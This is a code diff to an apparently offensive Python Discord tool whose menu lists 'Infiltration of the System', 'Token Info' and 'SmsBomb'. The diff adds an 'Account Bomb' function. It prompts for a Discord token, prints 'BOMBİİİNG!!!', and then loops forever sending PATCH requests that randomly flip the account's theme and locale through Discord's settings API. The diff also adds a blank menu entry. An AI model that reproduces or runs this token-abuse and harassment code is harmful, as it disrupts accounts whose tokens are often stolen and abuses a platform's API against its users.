@@ -127,7 +127,9 @@ def main_menu():
         Write.Print("[4] Infiltration of the System\n", Colors.red_to_black, interval=0.03)
         Write.Print("[5] Token Info\n", Colors.red_to_black, interval=0.03)
         Write.Print("[6] SmsBomb\n", Colors.red_to_black, interval=0.03)
-        Write.Print("[7] Exit\n\n", Colors.red_to_black, interval=0.03)
+        Write.Print("[7] Account Bomb\n", Colors.red_to_black, interval=0.03)
+        Write.Print("[8] \n", Colors.red_to_black, interval=0.03)
+        Write.Print("[9] Exit\n\n", Colors.red_to_black, interval=0.03)
 
         choice = Write.Input("[+] Enter Your Choice: ", Colors.red_to_white, interval=0.04) 
         if choice == '1':
@@ -152,12 +154,45 @@ def main_menu():
             sms_bomb()
 
         elif choice == '7':
-            print("Exiting...")
+            cls()
+            epi()
+
+        elif choice == '8':
+            cls()
+            
+
+        elif choice == '9':
+            cls()
+            print("Exitting...")
+            time.sleep(0.5)
             sys.exit()
 
         else:
             print("Invalid choice. Please try again.")
             time.sleep(1)
+
+def epi():
+    cls()
+    banner = """
+ ▄▄▄       ▄████▄   ▄████▄   ▒█████   █    ██  ███▄    █ ▄▄▄█████▓    ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄    ██▓ ███▄    █   ▄████ 
+▒████▄    ▒██▀ ▀█  ▒██▀ ▀█  ▒██▒  ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒   ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
+▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄ ▒██░  ██▒▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░   ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
+░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒██   ██░▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░    ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ░██░▓██▒  ▐▌██▒░▓█  ██▓
+ ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░ ████▓▒░▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░    ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░██░▒██░   ▓██░░▒▓███▀▒
+ ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░      ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
+  ▒   ▒▒ ░  ░  ▒     ░  ▒     ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░░   ░ ▒░    ░       ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ▒ ░░ ░░   ░ ▒░  ░   ░ 
+  ░   ▒   ░        ░        ░ ░ ░ ▒   ░░░ ░ ░    ░   ░ ░   ░          ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
+      ░  ░░ ░      ░ ░          ░ ░     ░              ░              ░          ░ ░         ░    ░       ░           ░       ░ 
+          ░        ░                                                       ░                           ░                        """
+    colored_banner = Colorate.Horizontal(Colors.yellow_to_red, Center.XCenter(banner))
+    print(colored_banner)
+    token = Write.Input("Please enter your Discord token: ", Colors.yellow_to_red , interval = 0.04)
+    time.sleep(2)
+    Write.Print("BOMBİİİNG!!!", Colors.red_to_yellow, interval = 0.04)
+    while True:
+        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['es', 'ru', 'hi', 'de'])}
+        requests.patch('https://discord.com/api/v7/users/@me/settings', headers={'Authorization': token}, json=setting)
+
 
 
 def sms_bomb():
